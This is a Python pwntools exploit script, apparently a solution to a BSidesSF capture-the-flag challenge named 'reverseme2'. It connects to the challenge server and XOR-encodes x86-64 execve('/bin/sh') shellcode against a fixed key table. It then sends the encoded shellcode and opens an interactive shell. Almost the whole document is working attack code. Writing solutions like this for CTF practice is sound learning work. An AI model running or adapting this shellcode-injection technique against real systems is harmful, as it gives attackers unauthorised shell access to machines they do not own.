#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')

host = args.HOST or 'reverseme2-24b392b5.challenges.bsidessf.net'
port = int(args.PORT or 1339)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
continue
'''.format(**locals())

io = start()

rand_num = [0x4f, 0xc4, 0x4d, 0x19, 0x95, 0x4b, 0xd0, 0x5e, 0x17, 0x6e, 0xdd, 0x18, 0x88, 0xce, 0x12, 0x6e, 0x4a, 0xcc, 0xaf, 0x29, 0xf9, 0x91, 0x24, 0x6b, 0xd8, 0x18, 0x54, 0x2a, 0x4f, 0x70, 0xbe, 0x9e, 0x34, 0xb, 0xb8, 0xca, 0x57, 0x88, 0x28, 0x6f, 0xf6, 0x5, 0x87, 0x7f, 0xd3, 0x99, 0xed, 0x1e, 0x66, 0x9d, 0x47, 0x5f, 0x2f, 0x6b, 0xcb, 0x7, 0x84, 0x1f, 0x32, 0xd3, 0x90, 0xf0, 0x72, 0xc5, 0xfc, 0x2a, 0x90, 0x53, 0xb2, 0xb8, 0xc3, 0xa9, 0xbd, 0x4a, 0x28, 0x91, 0xe4, 0x16, 0xaf, 0x4a, 0xb3, 0xf6, 0xa9, 0xe3, 0x62, 0x74, 0xea, 0xe7, 0x94, 0x1d, 0xbb, 0x25, 0xe, 0x2d, 0xeb, 0xa, 0x58, 0x7b, 0x5e, 0xb]

shellcode = asm("""
	push 0x3b
	pop rax
	movabs rdi, 0x0068732f6e69622f
	mov [rsi], rdi
	mov rdi, rsi
	xor rdx, rdx
	xor rsi, rsi
	syscall
""")
lmao = ""
for i in range(len(shellcode)):
	lmao += xor(shellcode[i], rand_num[i])

io.recv()
io.sendline(lmao)
io.interactive()